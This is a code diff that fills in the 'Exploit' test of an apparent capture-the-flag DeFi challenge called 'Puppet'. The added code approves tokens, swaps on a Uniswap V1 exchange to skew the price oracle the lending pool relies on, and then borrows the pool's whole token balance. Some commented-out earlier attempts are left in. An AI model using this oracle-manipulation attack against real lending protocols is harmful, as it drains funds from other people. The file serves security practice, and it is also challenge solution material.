@@ -3,6 +3,8 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+require("@nomiclabs/hardhat-ethers");
+
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -103,6 +105,39 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log('balance', attacker)
+        
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ethers.utils.parseEther('0.003'), // Swap a few DVL tokens to break the oracle
+                            // and earn enough ETH to cover gas fees.
+            1, // any amount over 1 WEI
+            deadline,
+        )
+        
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+        //     ATTACKER_INITIAL_TOKEN_BALANCE, 
+        //     1,
+        //     now + 1000
+        // )
+        // let oraclePrice = await this.lendingPool._computeOraclePrice();
+        
+        // console.log("****",oraclePrice);
+        // await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
+        // this.uniswapExcxhange.connect(attacker).tokenToEthSwapInput(
+        //     tokens_sold: uint256,
+        //     min_eth: uint256(wei),
+        //     deadline: timestamp
+        // ) 
+
     });
 
     after(async function () {
